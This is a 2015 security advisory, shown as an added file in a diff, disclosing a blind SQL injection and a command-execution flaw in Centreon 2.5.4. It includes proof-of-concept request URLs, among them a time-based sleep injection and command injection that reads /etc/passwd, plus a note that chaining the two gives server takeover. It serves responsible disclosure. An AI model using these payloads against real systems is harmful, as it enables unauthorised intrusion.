@@ -1,0 +1,64 @@
+Merethis Centreon - Unauthenticated blind SQLi and Authenticated Remote Command Execution
+
+CVEs: CVE-2015-1560, CVE-2015-1561
+
+Vendor: Merethis - www.centreon.com
+Product: Centreon
+Version affected: 2.5.4 and prior
+
+Product description:
+Centreon is the choice of some of the world's largest companies and mission-critical organizations for real-time IT performance monitoring and diagnostics management. (from https://www.centreon.com/en/)
+
+Advisory introduction:
+Centron 2.5.4 is susceptible to multiple vulnerabilities, including unauthenticated blind SQL injection and authenticated remote system command execution.
+
+Credit: Huy-Ngoc DAU of Deloitte Conseil, France
+
+================================
+Finding 1: Unauthenticated Blind SQL injection in isUserAdmin function (CVE-2015-1560)
+================================
+Vulnerable function is "isUserAdmin" (defined in include/common/common-Func.php), in which unsanitized "sid" GET parameter is used in a SQL request.
+
+PoC:
+https://example.domain/centreon/include/common/XmlTree/GetXmlTree.php?si
+d=%27%2Bif(1%3C2,sleep(1),%27%27)%2B%27
+https://example.domain/centreon/include/common/XmlTree/GetXmlTree.php?si
+d=%27%2Bif(1%3C0,sleep(1),%27%27)%2B%27
+
+By exploiting CVE-2015-1560, an attacker can obtain among others a valid session_id, which is required to exploit CVE-2015-1561.
+
+================================
+Finding 2: Authenticated Command Execution in getStats.php (CVE-2015-1561)
+================================
+$command_line variable, which is passed to popen function, is constructed using unsanitized GET parameters.
+
+PoC (a valid session_id value is required):
+- Reading /etc/passwd by injecting command into "ns_id" parameter:
+http://example.domain/centreon/include/Administration/corePerformance/ge
+tStats.php?ns_id=|+more+/etc/passwd+%23&key=active_service_check&start=t
+oday&session_id=[valid session_id]
+- Injecting "uname ?a" into "end" parameter:
+http://example.domain/centreon/include/Administration/corePerformance/ge
+tStats.php?ns_id=1&key=active_service_check&start=today&end=|+uname+-a+%
+23&session_id=[valid session_id]
+
+Combining two vulnerabilities, an unauthenticated attacker can take control of the web server.
+
+================================
+Timeline
+================================
+26/01/2015 - Vulnerabilities discovered
+29/01/2015 - Vendor notified
+05/02/2015 - Vendor fixed SQLi 
+13/02/2015 - Vendor fixed RCE
+
+References
+Vendor fixes:
+- SQLi : https://forge.centreon.com/projects/centreon/repository/revisions/d14f21
+3b9c60de1bad0b464fd6403c828cf12582
+- Command execution : https://forge.centreon.com/projects/centreon/repository/revisions/d14f21
+3b9c60de1bad0b464fd6403c828cf12582
+
+About Deloitte:
+Deloitte refers to one or more of Deloitte Touche Tohmatsu Limited, a UK private company limited by guarantee, and its network of member firms, each of which is a legally separate and independent entity. Please see www.deloitte.com/about for a detailed description of the legal structure of Deloitte Touche Tohmatsu Limited and its member firms. In France, Deloitte SAS is the member firm of Deloitte Touche Tohmatsu Limited, and professional services are provided by its subsidiaries and affiliates.
+Our Enterprise Risk Services practice is made up of over 11,000 professionals providing services relating to security, privacy & resilience; data governance and analytics; information and controls assurance; risk management technologies; and technology risk & governance. We help organizations build value by taking a "Risk Intelligent" approach to managing financial, technology, and business risks.
